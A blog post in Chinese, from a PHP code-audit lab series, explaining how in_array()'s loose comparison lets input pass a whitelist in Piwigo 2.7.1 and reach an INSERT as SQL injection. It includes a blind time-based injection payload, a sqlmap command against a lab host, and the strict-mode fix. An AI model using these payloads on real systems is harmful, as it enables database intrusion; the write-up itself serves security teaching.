@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+
+
+<title>PHP-Audit-Labs-Day1 in_array() 函数缺陷 | C0r1&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+</head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">c0r1&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">c0r1&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">PHP-Audit-Labs-Day1 in_array() 函数缺陷</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">c0r1</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">October 31, 2019&nbsp;&nbsp;22:34:22</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="&#x524D;&#x8A00;"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</h1><p> <a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day1/files/README.md" target="_blank" rel="noopener">[&#x7EA2;&#x65E5;&#x5B89;&#x5168;]&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;Day1 - in_array&#x51FD;&#x6570;&#x7F3A;&#x9677;</a> </p>
+<p>&#x7EC3;&#x4E60;&#x4EE3;&#x7801;&#x5BA1;&#x8BA1; ~</p>
+<h1 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h1><blockquote>
+<p><a href="http://php.net/manual/zh/function.in-array.php" target="_blank" rel="noopener"><strong>in_array</strong> </a>&#xFF1A;(PHP 4, PHP 5, PHP 7)</p>
+<p><strong>&#x529F;&#x80FD;</strong> &#xFF1A;&#x68C0;&#x67E5;&#x6570;&#x7EC4;&#x4E2D;&#x662F;&#x5426;&#x5B58;&#x5728;&#x67D0;&#x4E2A;&#x503C;</p>
+<p><strong>&#x5B9A;&#x4E49;</strong> &#xFF1A; <code>bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</code></p>
+<p>&#x5728; <strong>$haystack</strong> &#x4E2D;&#x641C;&#x7D22; <strong>$needle</strong> &#xFF0C;&#x5982;&#x679C;&#x7B2C;&#x4E09;&#x4E2A;&#x53C2;&#x6570; <strong>$strict</strong> &#x7684;&#x503C;&#x4E3A; <strong>TRUE</strong> &#xFF0C;&#x5219; <strong>in_array()</strong> &#x51FD;&#x6570;&#x4F1A;&#x8FDB;&#x884C;&#x5F3A;&#x68C0;&#x67E5;&#xFF0C;&#x68C0;&#x67E5; <strong>$needle</strong> &#x7684;&#x7C7B;&#x578B;&#x662F;&#x5426;&#x548C; <strong>$haystack</strong> &#x4E2D;&#x7684;&#x76F8;&#x540C;&#x3002;&#x5982;&#x679C;&#x627E;&#x5230; <strong>$haystack</strong> &#xFF0C;&#x5219;&#x8FD4;&#x56DE; <strong>TRUE</strong>&#xFF0C;&#x5426;&#x5219;&#x8FD4;&#x56DE; <strong>FALSE</strong></p>
+</blockquote>
+<p><strong>&#x6F0F;&#x6D1E;&#xFF1A;</strong>&#x57FA;&#x4E8E;&#x8BE5;&#x51FD;&#x6570;&#x9ED8;&#x8BA4;&#x503C;&#x7684;&#x9ED1;&#x767D;&#x540D;&#x5355;&#x68C0;&#x6D4B;&#x53EF;&#x88AB;&#x6784;&#x9020;&#x7684;&#x53C2;&#x6570;&#x503C;&#x7ED5;&#x8FC7;</p>
+<p><strong>&#x539F;&#x56E0;&#xFF1A;</strong>&#x4E0D;&#x5B89;&#x5168;&#x7684;&#x4F7F;&#x7528; <strong>in_array()</strong> &#x51FD;&#x6570;&#x4E2D;&#x9ED8;&#x8BA4;&#x503C;&#x8BBE;&#x7F6E;&#xFF0C;&#x8FDB;&#x884C;&#x4E86;&#x5F31;&#x7C7B;&#x578B;&#x6BD4;&#x8F83;</p>
+<p><strong>&#x4FEE;&#x590D;&#x5EFA;&#x8BAE;&#xFF1A;</strong> &#x5C06; <strong>in_array()</strong> &#x51FD;&#x6570;&#x7684;&#x7B2C;&#x4E09;&#x4E2A;&#x53C2;&#x6570;&#x8BBE;&#x7F6E;&#x4E3A; <strong>true</strong></p>
+<h1 id="&#x5B9E;&#x4F8B;&#x5206;&#x6790;"><a href="#&#x5B9E;&#x4F8B;&#x5206;&#x6790;" class="headerlink" title="&#x5B9E;&#x4F8B;&#x5206;&#x6790;"></a>&#x5B9E;&#x4F8B;&#x5206;&#x6790;</h1><p><strong>piwigo 2.7.1</strong> &#x7248;&#x672C;&#x4E2D; SQL &#x8BED;&#x53E5;&#x7531;&#x4E8E;&#x76F4;&#x63A5;&#x62FC;&#x63A5;&#x7ECF; <code>in_array()</code> &#x51FD;&#x6570;&#x7B80;&#x5355;&#x5904;&#x7406;&#x7684;&#x53D8;&#x91CF; <code>$rate</code> &#xFF0C;&#x800C;&#x5BFC;&#x81F4; SQL &#x6CE8;&#x5165;&#x6F0F;&#x6D1E;&#x4EA7;&#x751F;</p>
+<p>&#x6F0F;&#x6D1E;&#x4EE3;&#x7801;&#x5165;&#x53E3;&#x70B9; <code>picture.php</code>&#xFF0C;&#x5173;&#x952E;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF1A;</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&apos;action&apos;</span>]))</span><br><span class="line">{</span><br><span class="line">  <span class="keyword">switch</span> ($_GET[<span class="string">&apos;action&apos;</span>])</span><br><span class="line">  {   </span><br><span class="line">    	...</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&apos;rate&apos;</span> :</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">include_once</span>(PHPWG_ROOT_PATH.<span class="string">&apos;include/functions_rate.inc.php&apos;</span>);</span><br><span class="line">      rate_picture($page[<span class="string">&apos;image_id&apos;</span>], $_POST[<span class="string">&apos;rate&apos;</span>]);</span><br><span class="line">      redirect($url_self);</span><br><span class="line">    }</span><br><span class="line">    	...</span><br></pre></td></tr></table></figure>
+
+<p>&#x5F53; <strong>$_GET[&#x2018;action&#x2019;]</strong> &#x4E3A; <strong>rate</strong> &#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5C31;&#x4F1A;&#x8C03;&#x7528;&#x6587;&#x4EF6; <strong>include/functions_rate.inc.php</strong> &#x4E2D;&#x7684; <strong>rate_picture</strong> &#x65B9;&#x6CD5;&#x5904;&#x7406; <code>$_POST[&apos;rate&apos;]</code>&#xFF0C;&#x800C;&#x6F0F;&#x6D1E;&#x4FBF;&#x5B58;&#x5728;&#x4E8E;&#x8BE5;&#x65B9;&#x6CD5;&#x4E2D;&#xFF1A;</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rate_picture</span><span class="params">($image_id, $rate)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">global</span> $conf, $user;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">isset</span>($rate) <span class="keyword">or</span> !$conf[<span class="string">&apos;rate&apos;</span>] <span class="keyword">or</span> !in_array($rate, $conf[<span class="string">&apos;rate_items&apos;</span>]))</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  }</span><br><span class="line">  </span><br><span class="line">  $user_anonymous = is_autorize_status(ACCESS_CLASSIC) ? <span class="keyword">false</span> : <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ($user_anonymous <span class="keyword">and</span> !$conf[<span class="string">&apos;rate_anonymous&apos;</span>])</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  }  </span><br><span class="line">		......</span><br><span class="line">            </span><br><span class="line">  <span class="keyword">if</span> ($user_anonymous)</span><br><span class="line">  {</span><br><span class="line">    $query.= <span class="string">&apos; AND anonymous_id = \&apos;&apos;</span>.$anonymous_id.<span class="string">&apos;\&apos;&apos;</span>;</span><br><span class="line">  }</span><br><span class="line">  pwg_query($query);</span><br><span class="line">  $query = <span class="string">&apos;</span></span><br><span class="line"><span class="string">INSERT</span></span><br><span class="line"><span class="string">  INTO &apos;</span>.RATE_TABLE.<span class="string">&apos;</span></span><br><span class="line"><span class="string">  (user_id,anonymous_id,element_id,rate,date)</span></span><br><span class="line"><span class="string">  VALUES</span></span><br><span class="line"><span class="string">  (&apos;</span></span><br><span class="line">    .$user[<span class="string">&apos;id&apos;</span>].<span class="string">&apos;,&apos;</span></span><br><span class="line">    .<span class="string">&apos;\&apos;&apos;</span>.$anonymous_id.<span class="string">&apos;\&apos;,&apos;</span></span><br><span class="line">    .$image_id.<span class="string">&apos;,&apos;</span></span><br><span class="line">    .$rate</span><br><span class="line">    .<span class="string">&apos;,NOW())</span></span><br><span class="line"><span class="string">;&apos;</span>;</span><br><span class="line">  pwg_query($query);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> update_rating_score($image_id);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+
+<p>&#x4E0A;&#x5217;&#x4EE3;&#x7801;&#x6BB5;&#x4E2D;&#x7B2C; 6 &#x884C;&#x5229;&#x7528; <code>in_array()</code> &#x51FD;&#x6570;&#x5BF9; <code>$rate</code> &#x8FDB;&#x884C;&#x4E86;&#x4E00;&#x6B21;&#x7B80;&#x5355;&#x7684;&#x767D;&#x540D;&#x5355;&#x68C0;&#x6D4B;&#xFF0C;&#x968F;&#x540E;&#x76F4;&#x63A5;&#x4EE3;&#x5165; 33 &#x884C; INSERT &#x8BED;&#x53E5;&#x4E2D;&#x6267;&#x884C;</p>
+<p><code>$conf[&apos;rate_items&apos;]</code> &#x4F4D;&#x4E8E; <code>include/config_default.inc.php</code> &#x4E2D;&#xFF0C;&#x5185;&#x5BB9;&#x5982;&#x4E0B;&#xFF1A;</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$conf[<span class="string">&apos;rate_items&apos;</span>] = <span class="keyword">array</span>(<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);</span><br></pre></td></tr></table></figure>
+
+<p>6 &#x884C;&#x4E2D; <code>in_array($rate, $conf[&apos;rate_items&apos;])</code> &#x91C7;&#x7528;&#x7684;&#x677E;&#x6563;&#x6BD4;&#x8F83;&#x53EF;&#x88AB;&#x7ED5;&#x8FC7;&#xFF0C;&#x5BFC;&#x81F4; 33 &#x884C; INSERT &#x8BED;&#x53E5;&#x53EF;&#x63A7;</p>
+<p><img src="/2019/10/31/PHP-Audit-Labs-Day1-in-array-&#x51FD;&#x6570;&#x7F3A;&#x9677;/in_array.png" alt="image-20191101093057474"></p>
+<p> &#x6BD4;&#x5982;&#x6211;&#x4EEC;&#x5C06; <strong>$rate</strong> &#x7684;&#x503C;&#x8BBE;&#x7F6E;&#x6210; <code>1,1 and if(ascii(substr((select database()),1,1))=112,1,sleep(3)));#</code> &#x90A3;&#x4E48;SQL&#x8BED;&#x53E5;&#x5C31;&#x53D8;&#x6210;&#xFF1A; </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> piwigo_rate (user_id,anonymous_id,element_id,rate,<span class="built_in">date</span>) <span class="keyword">VALUES</span> (<span class="number">2</span>,<span class="string">&apos;192.168.2&apos;</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">if</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">112</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">3</span>)));<span class="comment">#,NOW()) ;</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x4EA7;&#x751F;&#x76F2;&#x6CE8;&#xFF0C;&#x7B80;&#x5316;&#x540E;&#x7684; <code>$rate</code> &#x5904;&#x7406;&#x6D41;&#x5982;&#x4E0B;</p>
+<p><img src="/2019/10/31/PHP-Audit-Labs-Day1-in-array-&#x51FD;&#x6570;&#x7F3A;&#x9677;/4.png" alt="4"></p>
+<h1 id="&#x6F0F;&#x6D1E;&#x5229;&#x7528;"><a href="#&#x6F0F;&#x6D1E;&#x5229;&#x7528;" class="headerlink" title="&#x6F0F;&#x6D1E;&#x5229;&#x7528;"></a>&#x6F0F;&#x6D1E;&#x5229;&#x7528;</h1><p>&#x5229;&#x7528; sqlmap &#x9A8C;&#x8BC1; </p>
+<p><img src="/2019/10/31/PHP-Audit-Labs-Day1-in-array-&#x51FD;&#x6570;&#x7F3A;&#x9677;/bool.png" alt="img"> </p>
+<p>Payload&#x5982;&#x4E0B;&#xFF1A;</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.92.130/picture.php?/1/category/1&amp;action=rate &quot; --data &quot;rate=1&quot; --dbs</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/10/31/PHP-Audit-Labs-Day1-in-array-&#x51FD;&#x6570;&#x7F3A;&#x9677;/day1.png" alt="image-20191101115715430"></p>
+<h1 id="&#x7ED3;&#x8BED;"><a href="#&#x7ED3;&#x8BED;" class="headerlink" title="&#x7ED3;&#x8BED;"></a>&#x7ED3;&#x8BED;</h1><p>&#x9644;&#x4E0A;&#x5148;&#x77E5;  <strong>chybeta</strong> &#x8868;&#x54E5;&#x5173;&#x4E8E; <code>in_array()</code> &#x51FD;&#x6570;&#x5728;&#x975E;&#x4E25;&#x683C;&#x6A21;&#x5F0F;&#x4E0E;&#x4E25;&#x683C;&#x6A21;&#x5F0F;&#x4E0B;&#x533A;&#x522B;&#x7684;&#x4E00;&#x6BB5;&#x4EE3;&#x7801;</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$array = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&apos;egg&apos;</span> =&gt; <span class="keyword">true</span>,</span><br><span class="line">    <span class="string">&apos;cheese&apos;</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line">    <span class="string">&apos;hair&apos;</span> =&gt; <span class="number">765</span>,</span><br><span class="line">    <span class="string">&apos;goblins&apos;</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">    <span class="string">&apos;ogres&apos;</span> =&gt; <span class="string">&apos;no ogres allowed in this array&apos;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Loose checking -- return values are in comments</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// First three make sense, last four do not</span></span><br><span class="line"></span><br><span class="line">var_dump(in_array(<span class="keyword">null</span>, $array)); <span class="comment">// true</span></span><br><span class="line">var_dump(in_array(<span class="keyword">false</span>, $array)); <span class="comment">// true</span></span><br><span class="line">var_dump(in_array(<span class="number">765</span>, $array)); <span class="comment">// true</span></span><br><span class="line">var_dump(in_array(<span class="number">763</span>, $array)); <span class="comment">// true</span></span><br><span class="line">var_dump(in_array(<span class="string">&apos;egg&apos;</span>, $array)); <span class="comment">// true</span></span><br><span class="line">var_dump(in_array(<span class="string">&apos;hhh&apos;</span>, $array)); <span class="comment">// true</span></span><br><span class="line">var_dump(in_array(<span class="keyword">array</span>(), $array)); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Strict checking</span></span><br><span class="line">var_dump(in_array(<span class="keyword">null</span>, $array, <span class="keyword">true</span>)); <span class="comment">// true</span></span><br><span class="line">var_dump(in_array(<span class="keyword">false</span>, $array, <span class="keyword">true</span>)); <span class="comment">// true</span></span><br><span class="line">var_dump(in_array(<span class="number">765</span>, $array, <span class="keyword">true</span>)); <span class="comment">// true</span></span><br><span class="line">var_dump(in_array(<span class="number">763</span>, $array, <span class="keyword">true</span>)); <span class="comment">// false</span></span><br><span class="line">var_dump(in_array(<span class="string">&apos;egg&apos;</span>, $array, <span class="keyword">true</span>)); <span class="comment">// false</span></span><br><span class="line">var_dump(in_array(<span class="string">&apos;hhh&apos;</span>, $array, <span class="keyword">true</span>)); <span class="comment">// false</span></span><br><span class="line">var_dump(in_array(<span class="keyword">array</span>(), $array, <span class="keyword">true</span>)); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h1><p> <a href="https://xz.aliyun.com/t/2451" target="_blank" rel="noopener">[&#x7EA2;&#x65E5;&#x5B89;&#x5168;]&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;Day1 - in_array&#x51FD;&#x6570;&#x7F3A;&#x9677;</a> </p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>c0r1</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://www.c0r1.com/2019/10/31/PHP-Audit-Labs-Day1-in-array-函数缺陷/">http://www.c0r1.com/2019/10/31/PHP-Audit-Labs-Day1-in-array-函数缺陷/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/代码审计/"># 代码审计</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/11/01/Day1-CTF/">Day1-CTF</a>
+            
+            
+            <a class="next" rel="next" href="/2019/10/20/DPAPI/">DPAPI</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© c0r1 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
